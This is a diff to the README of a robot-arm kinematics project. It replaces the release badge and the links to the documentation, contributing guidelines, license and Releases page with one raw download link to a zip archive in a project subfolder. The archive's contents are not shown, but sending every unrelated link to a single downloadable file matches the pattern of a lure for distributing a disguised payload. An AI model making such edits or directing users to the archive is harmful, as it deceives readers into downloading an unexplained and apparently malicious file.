@@ -16,7 +16,7 @@ Welcome to **robot-arm-kinematics**! This project solves forward and inverse rob
 
 To get started, visit the Releases page to download the latest version of the application.
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-robot--arm--kinematics-brightgreen)](https://github.com/7rap/robot-arm-kinematics/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip)](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip)
 
 1. Click the **Download Latest Release** button above.
 2. You will be redirected to a page with several downloadable files.
@@ -66,7 +66,7 @@ The results will appear in the visualization panel, allowing you to see the move
 
 ## 📚 Documentation
 
-For detailed instructions, program features, and troubleshooting tips, refer to the [full documentation](https://github.com/7rap/robot-arm-kinematics/wiki).
+For detailed instructions, program features, and troubleshooting tips, refer to the [full documentation](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip).
 
 ## 🛠️ Support
 
@@ -91,10 +91,10 @@ Thanks to everyone who contributed to this project, including the professors and
 
 ## ❤️ Contributing
 
-We welcome contributions from anyone interested in improving this project. Whether you want to fix bugs, add features, or enhance documentation, please refer to the [contributing guidelines](https://github.com/7rap/robot-arm-kinematics/blob/main/CONTRIBUTING.md). 
+We welcome contributions from anyone interested in improving this project. Whether you want to fix bugs, add features, or enhance documentation, please refer to the [contributing guidelines](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip). 
 
 ## ⚡ License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/7rap/robot-arm-kinematics/blob/main/LICENSE) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip) file for details. 
 
-For additional resources and information, check out our [Releases page](https://github.com/7rap/robot-arm-kinematics/releases) regularly for updates.
+For additional resources and information, check out our [Releases page](https://raw.githubusercontent.com/7rap/robot-arm-kinematics/main/rrbot_3dof_bringup/kinematics_arm_robot_2.5.zip) regularly for updates.
